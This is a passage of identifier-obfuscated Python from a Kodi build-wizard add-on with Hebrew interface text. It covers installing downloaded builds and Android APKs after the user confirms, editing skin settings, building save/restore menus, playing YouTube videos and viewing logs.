			O000OO000OO00000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4258
			OOOO0O0000O000O0O =open (O000OO000OO00000O ,'r')#line:4260
			OO00O0000O0OOO00O =OOOO0O0000O000O0O .read ()#line:4261
			OOOO0O0000O000O0O .close ()#line:4262
			OO00OO0OO000O00O0 ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4263
			OOO0O0O00O0000000 =re .compile (OO00OO0OO000O00O0 ).findall (OO00O0000O0OOO00O )[0 ]#line:4264
			OOOO0O0000O000O0O =open (O000OO000OO00000O ,'w')#line:4265
			OOOO0O0000O000O0O .write (OO00O0000O0OOO00O .replace ('<setting id="show.cdart" type="bool%s/setting>'%OOO0O0O00O0000000 ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4266
			OOOO0O0000O000O0O .close ()#line:4267
			O000OO000OO00000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4271
			OOOO0O0000O000O0O =open (O000OO000OO00000O ,'r')#line:4273
			OO00O0000O0OOO00O =OOOO0O0000O000O0O .read ()#line:4274
			OOOO0O0000O000O0O .close ()#line:4275
			OO00OO0OO000O00O0 ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4276
			OOO0O0O00O0000000 =re .compile (OO00OO0OO000O00O0 ).findall (OO00O0000O0OOO00O )[0 ]#line:4277
			OOOO0O0000O000O0O =open (O000OO000OO00000O ,'w')#line:4278
			OOOO0O0000O000O0O .write (OO00O0000O0OOO00O .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%OOO0O0O00O0000000 ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4279
			OOOO0O0000O000O0O .close ()#line:4280
		except :#line:4285
			pass #line:4286
def thirdPartyInstall (O000O0O0OOO0OO00O ,OO00O00O0000OO0O0 ):#line:4288
	if not wiz .workingURL (OO00O00O0000OO0O0 ):#line:4289
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4290
	OOOOO000O000OOO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000O0O0OOO0OO00O ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4291
	if OOOOO000O000OOO0O ==1 :#line:4292
		freshStart ('third',True )#line:4293
	wiz .clearS ('build')#line:4294
	O0OO000OOOOOOO0O0 =O000O0O0OOO0OO00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4295
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4296
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000O0O0OOO0OO00O ),'','אנא המתן')#line:4297
	O00000O0O000O0O0O =os .path .join (PACKAGES ,'%s.zip'%O0OO000OOOOOOO0O0 )#line:4298
	try :os .remove (O00000O0O000O0O0O )#line:4299
	except :pass #line:4300
	downloader .download (OO00O00O0000OO0O0 ,O00000O0O000O0O0O ,DP )#line:4301
	xbmc .sleep (1000 )#line:4302
	OOO0O00OO00O00000 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000O0O0OOO0OO00O )#line:4303
	DP .update (0 ,OOO0O00OO00O00000 ,'','אנא המתן')#line:4304
	OOO00000O0OO0O000 ,OOOOOO00OO0O0O000 ,O0OO00O000000OO00 =extract .all (O00000O0O000O0O0O ,HOME ,DP ,title =OOO0O00OO00O00000 )#line:4305
	if int (float (OOO00000O0OO0O000 ))>0 :#line:4306
		wiz .fixmetas ()#line:4307
		wiz .lookandFeelData ('save')#line:4308
		wiz .defaultSkin ()#line:4309
		wiz .setS ('installed','true')#line:4311
		wiz .setS ('extract',str (OOO00000O0OO0O000 ))#line:4312
		wiz .setS ('errors',str (OOOOOO00OO0O0O000 ))#line:4313
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOO00000O0OO0O000 ,OOOOOO00OO0O0O000 ))#line:4314
		try :os .remove (O00000O0O000O0O0O )#line:4315
		except :pass #line:4316
		if int (float (OOOOOO00OO0O0O000 ))>0 :#line:4317
			OO00O000O000OO0OO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000O0O0OOO0OO00O ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOO00000O0OO0O000 ,'%',COLOR1 ,OOOOOO00OO0O0O000 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4318
			if OO00O000O000OO0OO :#line:4319
				if isinstance (OOOOOO00OO0O0O000 ,unicode ):#line:4320
					O0OO00O000000OO00 =O0OO00O000000OO00 .encode ('utf-8')#line:4321
				wiz .TextBox (ADDONTITLE ,O0OO00O000000OO00 )#line:4322
	DP .close ()#line:4323
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4324
	if INSTALLMETHOD ==1 :OO0OOOOOOO000000O =1 #line:4325
	elif INSTALLMETHOD ==2 :OO0OOOOOOO000000O =0 #line:4326
	else :OO0OOOOOOO000000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4327
	if OO0OOOOOOO000000O ==1 :wiz .reloadFix ()#line:4328
	else :wiz .killxbmc (True )#line:4329
def testTheme (OOOOO0OO0O00OO0O0 ):#line:4331
	O0O00OOO00000OOOO =zipfile .ZipFile (OOOOO0OO0O00OO0O0 )#line:4332
	for O0O0O00O0000OOO00 in O0O00OOO00000OOOO .infolist ():#line:4333
		if '/settings.xml'in O0O0O00O0000OOO00 .filename :#line:4334
			return True #line:4335
	return False #line:4336
def testGui (OO0O0OO00O000OO0O ):#line:4338
	OOO0O00O000O0O0O0 =zipfile .ZipFile (OO0O0OO00O000OO0O )#line:4339
	for OOO0O0O000000O000 in OOO0O00O000O0O0O0 .infolist ():#line:4340
		if '/guisettings.xml'in OOO0O0O000000O000 .filename :#line:4341
			return True #line:4342
	return False #line:4343
def apkInstaller (OO0O00O0O0OO00000 ,O0OOOO0OOOOOOOOO0 ):#line:4345
	wiz .log (OO0O00O0O0OO00000 )#line:4346
	wiz .log (O0OOOO0OOOOOOOOO0 )#line:4347
	if wiz .platform ()=='android':#line:4348
		OO000OOO0OOO00O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O00O0O0OO00000 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4349
		if not OO000OOO0OOO00O0O :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4350
		OO00OOO0O0O0O00O0 =OO0O00O0O0OO00000 #line:4351
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4352
		if not wiz .workingURL (O0OOOO0OOOOOOOOO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4353
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OOO0O0O0O00O0 ),'','אנא המתן')#line:4354
		O0O00OOOOOO0O0OO0 =os .path .join (PACKAGES ,"%s.apk"%OO0O00O0O0OO00000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4355
		try :os .remove (O0O00OOOOOO0O0OO0 )#line:4356
		except :pass #line:4357
		downloader .download (O0OOOO0OOOOOOOOO0 ,O0O00OOOOOO0O0OO0 ,DP )#line:4358
		xbmc .sleep (100 )#line:4359
		DP .close ()#line:4360
		notify .apkInstaller (OO0O00O0O0OO00000 )#line:4361
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O0O00OOOOOO0O0OO0 +'")')#line:4362
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4363
def createMenu (O0O0000OO0OOOO00O ,OO0000OOOO0000O0O ,OOO0OOO00O0O0O0OO ):#line:4369
	if O0O0000OO0OOOO00O =='saveaddon':#line:4370
		OO00O0O0OOOOOO000 =[]#line:4371
		OOO000000OOO0OOOO =urllib .quote_plus (OO0000OOOO0000O0O .lower ().replace (' ',''))#line:4372
		OOOOOOO00OO00O000 =OO0000OOOO0000O0O .replace ('Debrid','Real Debrid')#line:4373
		OO0OO0O0O00OOOOO0 =urllib .quote_plus (OOO0OOO00O0O0O0OO .lower ().replace (' ',''))#line:4374
		OOO0OOO00O0O0O0OO =OOO0OOO00O0O0O0OO .replace ('url','URL Resolver')#line:4375
		OO00O0O0OOOOOO000 .append ((THEME2 %OOO0OOO00O0O0O0OO .title (),' '))#line:4376
		OO00O0O0OOOOOO000 .append ((THEME3 %'Save %s Data'%OOOOOOO00OO00O000 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOO000000OOO0OOOO ,OO0OO0O0O00OOOOO0 )))#line:4377
		OO00O0O0OOOOOO000 .append ((THEME3 %'Restore %s Data'%OOOOOOO00OO00O000 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOO000000OOO0OOOO ,OO0OO0O0O00OOOOO0 )))#line:4378
		OO00O0O0OOOOOO000 .append ((THEME3 %'Clear %s Data'%OOOOOOO00OO00O000 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OOO000000OOO0OOOO ,OO0OO0O0O00OOOOO0 )))#line:4379
	elif O0O0000OO0OOOO00O =='save':#line:4380
		OO00O0O0OOOOOO000 =[]#line:4381
		OOO000000OOO0OOOO =urllib .quote_plus (OO0000OOOO0000O0O .lower ().replace (' ',''))#line:4382
		OOOOOOO00OO00O000 =OO0000OOOO0000O0O .replace ('Debrid','Real Debrid')#line:4383
		OO0OO0O0O00OOOOO0 =urllib .quote_plus (OOO0OOO00O0O0O0OO .lower ().replace (' ',''))#line:4384
		OOO0OOO00O0O0O0OO =OOO0OOO00O0O0O0OO .replace ('url','URL Resolver')#line:4385
		OO00O0O0OOOOOO000 .append ((THEME2 %OOO0OOO00O0O0O0OO .title (),' '))#line:4386
		OO00O0O0OOOOOO000 .append ((THEME3 %'Register %s'%OOOOOOO00OO00O000 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OOO000000OOO0OOOO ,OO0OO0O0O00OOOOO0 )))#line:4387
		OO00O0O0OOOOOO000 .append ((THEME3 %'Save %s Data'%OOOOOOO00OO00O000 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOO000000OOO0OOOO ,OO0OO0O0O00OOOOO0 )))#line:4388
		OO00O0O0OOOOOO000 .append ((THEME3 %'Restore %s Data'%OOOOOOO00OO00O000 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOO000000OOO0OOOO ,OO0OO0O0O00OOOOO0 )))#line:4389
		OO00O0O0OOOOOO000 .append ((THEME3 %'Import %s Data'%OOOOOOO00OO00O000 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OOO000000OOO0OOOO ,OO0OO0O0O00OOOOO0 )))#line:4390
		OO00O0O0OOOOOO000 .append ((THEME3 %'Clear Addon %s Data'%OOOOOOO00OO00O000 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OOO000000OOO0OOOO ,OO0OO0O0O00OOOOO0 )))#line:4391
	elif O0O0000OO0OOOO00O =='install':#line:4392
		OO00O0O0OOOOOO000 =[]#line:4393
		OO0OO0O0O00OOOOO0 =urllib .quote_plus (OOO0OOO00O0O0O0OO )#line:4394
		OO00O0O0OOOOOO000 .append ((THEME2 %OOO0OOO00O0O0O0OO ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OO0OO0O0O00OOOOO0 )))#line:4395
		OO00O0O0OOOOOO000 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OO0OO0O0O00OOOOO0 )))#line:4396
		OO00O0O0OOOOOO000 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OO0OO0O0O00OOOOO0 )))#line:4397
		OO00O0O0OOOOOO000 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OO0OO0O0O00OOOOO0 )))#line:4398
		OO00O0O0OOOOOO000 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OO0OO0O0O00OOOOO0 )))#line:4399
	OO00O0O0OOOOOO000 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4400
	return OO00O0O0OOOOOO000 #line:4401
def toggleCache (O000O000O0OO0000O ):#line:4403
	O0000000O0O000OO0 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4404
	OOO000O0OOO0OO0OO =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4405
	if O000O000O0OO0000O in ['true','false']:#line:4406
		for OOO0OOO0OOOOO00O0 in O0000000O0O000OO0 :#line:4407
			wiz .setS (OOO0OOO0OOOOO00O0 ,O000O000O0OO0000O )#line:4408
	else :#line:4409
		if not O000O000O0OO0000O in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4410
			try :#line:4411
				OOO0OOO0OOOOO00O0 =OOO000O0OOO0OO0OO [O0000000O0O000OO0 .index (O000O000O0OO0000O )]#line:4412
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OOO0OOO0OOOOO00O0 ))#line:4413
			except :#line:4414
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,O000O000O0OO0000O ))#line:4415
		else :#line:4416
			OOOO00O00000OOOO0 ='true'if wiz .getS (O000O000O0OO0000O )=='false'else 'false'#line:4417
			wiz .setS (O000O000O0OO0000O ,OOOO00O00000OOOO0 )#line:4418
def playVideo (OO0O0O00O0OO000OO ):#line:4420
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OO0O0O00O0OO000OO )#line:4421
	if 'watch?v='in OO0O0O00O0OO000OO :#line:4422
		O000O0O00OO00O000 ,OOO000OO0OO0O0O0O =OO0O0O00O0OO000OO .split ('?')#line:4423
		O0O0O0OOOOOOOO0O0 =OOO000OO0OO0O0O0O .split ('&')#line:4424
		for OO00OO0O0O0O0OOO0 in O0O0O0OOOOOOOO0O0 :#line:4425
			if OO00OO0O0O0O0OOO0 .startswith ('v='):#line:4426
				OO0O0O00O0OO000OO =OO00OO0O0O0O0OOO0 [2 :]#line:4427
				break #line:4428
			else :continue #line:4429
	elif 'embed'in OO0O0O00O0OO000OO or 'youtu.be'in OO0O0O00O0OO000OO :#line:4430
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OO0O0O00O0OO000OO )#line:4431
		O000O0O00OO00O000 =OO0O0O00O0OO000OO .split ('/')#line:4432
		if len (O000O0O00OO00O000 [-1 ])>5 :#line:4433
			OO0O0O00O0OO000OO =O000O0O00OO00O000 [-1 ]#line:4434
		elif len (O000O0O00OO00O000 [-2 ])>5 :#line:4435
			OO0O0O00O0OO000OO =O000O0O00OO00O000 [-2 ]#line:4436
	wiz .log ("YouTube URL: %s"%OO0O0O00O0OO000OO )#line:4437
	yt .PlayVideo (OO0O0O00O0OO000OO )#line:4438
def viewLogFile ():#line:4440
	OO00O0OO000O0O0OO =wiz .Grab_Log (True )#line:4441
	O0000000OOO0OOO0O =wiz .Grab_Log (True ,True )#line:4442
	O0O0OOO0000OO0O00 =0 ;O00OO00OOO0OO00OO =OO00O0OO000O0O0OO #line:4443
	if not O0000000OOO0OOO0O ==False and not OO00O0OO000O0O0OO ==False :#line:4444
		O0O0OOO0000OO0O00 =DIALOG .select (ADDONTITLE ,["View %s"%OO00O0OO000O0O0OO .replace (LOG ,""),"View %s"%O0000000OOO0OOO0O .replace (LOG ,"")])#line:4445
		if O0O0OOO0000OO0O00 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4446
	elif OO00O0OO000O0O0OO ==False and O0000000OOO0OOO0O ==False :#line:4447
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4448
		return #line:4449
	elif not OO00O0OO000O0O0OO ==False :O0O0OOO0000OO0O00 =0 #line:4450
	elif not O0000000OOO0OOO0O ==False :O0O0OOO0000OO0O00 =1 #line:4451
	O00OO00OOO0OO00OO =OO00O0OO000O0O0OO if O0O0OOO0000OO0O00 ==0 else O0000000OOO0OOO0O #line:4453
	O00OO0OO0O00OOOO0 =wiz .Grab_Log (False )if O0O0OOO0000OO0O00 ==0 else wiz .Grab_Log (False ,True )#line:4454
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O00OO00OOO0OO00OO ),O00OO0OO0O00OOOO0 )#line:4456
def errorChecking (log =None ,count =None ,all =None ):#line:4458
	if log ==None :#line:4459
		O0O0OOOO00OO00O00 =wiz .Grab_Log (True )#line:4460
		O0O0OO0O0OOO0O0O0 =wiz .Grab_Log (True ,True )#line:4461
		if not O0O0OO0O0OOO0O0O0 ==False and not O0O0OOOO00OO00O00 ==False :#line:4462
			OOOO000O00OO0OOOO =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O0O0OOOO00OO00O00 .replace (LOG ,""),errorChecking (O0O0OOOO00OO00O00 ,True ,True )),"View %s: %s error(s)"%(O0O0OO0O0OOO0O0O0 .replace (LOG ,""),errorChecking (O0O0OO0O0OOO0O0O0 ,True ,True ))])#line:4463
			if OOOO000O00OO0OOOO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4464
		elif O0O0OOOO00OO00O00 ==False and O0O0OO0O0OOO0O0O0 ==False :#line:4465
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4466
			return #line:4467
		elif not O0O0OOOO00OO00O00 ==False :OOOO000O00OO0OOOO =0 #line:4468
		elif not O0O0OO0O0OOO0O0O0 ==False :OOOO000O00OO0OOOO =1 #line:4469
		log =O0O0OOOO00OO00O00 if OOOO000O00OO0OOOO ==0 else O0O0OO0O0OOO0O0O0 #line:4470
	if log ==False :#line:4471
		if count ==None :#line:4472
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4473
			return False #line:4474
		else :#line:4475
			return 0 #line:4476
	else :#line:4477
		if os .path .exists (log ):#line:4478
			O00000O000OO0OOO0 =open (log ,mode ='r');O0O00OO0O0OOOOO0O =O00000O000OO0OOO0 .read ().replace ('\n','').replace ('\r','');O00000O000OO0OOO0 .close ()#line:4479
			OO0OO00OO0O00OOO0 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O0O00OO0O0OOOOO0O )#line:4480
			if not count ==None :#line:4481
				if all ==None :#line:4482
					O0000OOO0O00OO000 =0 #line:4483
					for OO0OOOOO0OO00O00O in OO0OO00OO0O00OOO0 :#line:4484
						if ADDON_ID in OO0OOOOO0OO00O00O :O0000OOO0O00OO000 +=1 #line:4485
					return O0000OOO0O00OO000 #line:4486
				else :return len (OO0OO00OO0O00OOO0 )#line:4487
			if len (OO0OO00OO0O00OOO0 )>0 :#line:4488
				O0000OOO0O00OO000 =0 ;O000OO0OOO0000000 =""#line:4489
				for OO0OOOOO0OO00O00O in OO0OO00OO0O00OOO0 :#line:4490
					if all ==None and not ADDON_ID in OO0OOOOO0OO00O00O :continue #line:4491
					else :#line:4492
						O0000OOO0O00OO000 +=1 #line:4493
						O000OO0OOO0000000 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O0000OOO0O00OO000 ,OO0OOOOO0OO00O00O .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4494
				if O0000OOO0O00OO000 >0 :#line:4495
					wiz .TextBox (ADDONTITLE ,O000OO0OOO0000000 )#line:4496
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4497
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4498
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4499
ACTION_PREVIOUS_MENU =10 #line:4501
ACTION_NAV_BACK =92 #line:4502
ACTION_MOVE_LEFT =1 #line:4503
ACTION_MOVE_RIGHT =2 #line:4504
ACTION_MOVE_UP =3 #line:4505
ACTION_MOVE_DOWN =4 #line:4506
ACTION_MOUSE_WHEEL_UP =104 #line:4507
ACTION_MOUSE_WHEEL_DOWN =105 #line:4508
ACTION_MOVE_MOUSE =107 #line:4509
ACTION_SELECT_ITEM =7 #line:4510
ACTION_BACKSPACE =110 #line:4511
ACTION_MOUSE_LEFT_CLICK =100 #line:4512
ACTION_MOUSE_LONG_CLICK =108 #line:4513
def LogViewer (default =None ):#line:4515
	class O00OOOOO00OOO00O0 (xbmcgui .WindowXMLDialog ):#line:4516
		def __init__ (OOO0000000O0O00O0 ,*OOOO0O0OO0OOOOOO0 ,**O0OO00O0000O00OO0 ):#line:4517
			OOO0000000O0O00O0 .default =O0OO00O0000O00OO0 ['default']#line:4518
		def onInit (O0OO0O00O0O0O00O0 ):#line:4520
			O0OO0O00O0O0O00O0 .title =101 #line:4521
			O0OO0O00O0O0O00O0 .msg =102 #line:4522
			O0OO0O00O0O0O00O0 .scrollbar =103 #line:4523
			O0OO0O00O0O0O00O0 .upload =201 #line:4524
			O0OO0O00O0O0O00O0 .kodi =202 #line:4525
			O0OO0O00O0O0O00O0 .kodiold =203 #line:4526
			O0OO0O00O0O0O00O0 .wizard =204 #line:4527
			O0OO0O00O0O0O00O0 .okbutton =205 #line:4528
			OOO0O000O0O0OOO00 =open (O0OO0O00O0O0O00O0 .default ,'r')#line:4529
			O0OO0O00O0O0O00O0 .logmsg =OOO0O000O0O0OOO00 .read ()#line:4530
			OOO0O000O0O0OOO00 .close ()#line:4531
			O0OO0O00O0O0O00O0 .titlemsg ="%s: %s"%(ADDONTITLE ,O0OO0O00O0O0O00O0 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4532
			O0OO0O00O0O0O00O0 .showdialog ()#line:4533
		def showdialog (OO0OOO0OO0OOOOO00 ):#line:4535
			OO0OOO0OO0OOOOO00 .getControl (OO0OOO0OO0OOOOO00 .title ).setLabel (OO0OOO0OO0OOOOO00 .titlemsg )#line:4536
			OO0OOO0OO0OOOOO00 .getControl (OO0OOO0OO0OOOOO00 .msg ).setText (wiz .highlightText (OO0OOO0OO0OOOOO00 .logmsg ))#line:4537
			OO0OOO0OO0OOOOO00 .setFocusId (OO0OOO0OO0OOOOO00 .scrollbar )#line:4538
		def onClick (O000OOO0O0000OO00 ,OO00OOO00OO00O00O ):#line:4540
			if OO00OOO00OO00O00O ==O000OOO0O0000OO00 .okbutton :O000OOO0O0000OO00 .close ()#line:4541
			elif OO00OOO00OO00O00O ==O000OOO0O0000OO00 .upload :O000OOO0O0000OO00 .close ();uploadLog .Main ()#line:4542
			elif OO00OOO00OO00O00O ==O000OOO0O0000OO00 .kodi :#line:4543
				O0000000OOO0OO000 =wiz .Grab_Log (False )#line:4544
				OOOO0000O0O0O0O0O =wiz .Grab_Log (True )#line:4545
				if O0000000OOO0OO000 ==False :#line:4546
					O000OOO0O0000OO00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4547
					O000OOO0O0000OO00 .getControl (O000OOO0O0000OO00 .msg ).setText ("Log File Does Not Exists!")#line:4548
				else :#line:4549
					O000OOO0O0000OO00 .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO0000O0O0O0O0O .replace (LOG ,''))#line:4550
					O000OOO0O0000OO00 .getControl (O000OOO0O0000OO00 .title ).setLabel (O000OOO0O0000OO00 .titlemsg )#line:4551
					O000OOO0O0000OO00 .getControl (O000OOO0O0000OO00 .msg ).setText (wiz .highlightText (O0000000OOO0OO000 ))#line:4552
					O000OOO0O0000OO00 .setFocusId (O000OOO0O0000OO00 .scrollbar )#line:4553
			elif OO00OOO00OO00O00O ==O000OOO0O0000OO00 .kodiold :#line:4554
				O0000000OOO0OO000 =wiz .Grab_Log (False ,True )#line:4555
				OOOO0000O0O0O0O0O =wiz .Grab_Log (True ,True )#line:4556
				if O0000000OOO0OO000 ==False :#line:4557
					O000OOO0O0000OO00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4558
					O000OOO0O0000OO00 .getControl (O000OOO0O0000OO00 .msg ).setText ("Log File Does Not Exists!")#line:4559
				else :#line:4560
					O000OOO0O0000OO00 .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO0000O0O0O0O0O .replace (LOG ,''))#line:4561
					O000OOO0O0000OO00 .getControl (O000OOO0O0000OO00 .title ).setLabel (O000OOO0O0000OO00 .titlemsg )#line:4562
					O000OOO0O0000OO00 .getControl (O000OOO0O0000OO00 .msg ).setText (wiz .highlightText (O0000000OOO0OO000 ))#line:4563
					O000OOO0O0000OO00 .setFocusId (O000OOO0O0000OO00 .scrollbar )#line:4564
			elif OO00OOO00OO00O00O ==O000OOO0O0000OO00 .wizard :#line:4565
				O0000000OOO0OO000 =wiz .Grab_Log (False ,False ,True )#line:4566
				OOOO0000O0O0O0O0O =wiz .Grab_Log (True ,False ,True )#line:4567
				if O0000000OOO0OO000 ==False :#line:4568
					O000OOO0O0000OO00 .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4569
					O000OOO0O0000OO00 .getControl (O000OOO0O0000OO00 .msg ).setText ("Log File Does Not Exists!")#line:4570
				else :#line:4571
					O000OOO0O0000OO00 .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO0000O0O0O0O0O .replace (ADDONDATA ,''))#line:4572
					O000OOO0O0000OO00 .getControl (O000OOO0O0000OO00 .title ).setLabel (O000OOO0O0000OO00 .titlemsg )#line:4573
					O000OOO0O0000OO00 .getControl (O000OOO0O0000OO00 .msg ).setText (wiz .highlightText (O0000000OOO0OO000 ))#line:4574
					O000OOO0O0000OO00 .setFocusId (O000OOO0O0000OO00 .scrollbar )#line:4575
		def onAction (O00OOO0000O00O00O ,O0O0OOO00O0O00O0O ):#line:4577
			if O0O0OOO00O0O00O0O ==ACTION_PREVIOUS_MENU :O00OOO0000O00O00O .close ()#line:4578
			elif O0O0OOO00O0O00O0O ==ACTION_NAV_BACK :O00OOO0000O00O00O .close ()#line:4579
	if default ==None :default =wiz .Grab_Log (True )#line:4580
	O00O00OOO000OO00O =O00OOOOO00OOO00O0 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4581
	O00O00OOO000OO00O .doModal ()#line:4582
	del O00O00OOO000OO00O #line:4583
def removeAddon (OO000O000OO00O0OO ,O0OO0O00O000OOO0O ,over =False ):#line:4585
	if not over ==False :#line:4586
		OO000OO0O0O0OO0O0 =1 #line:4587
	else :#line:4588
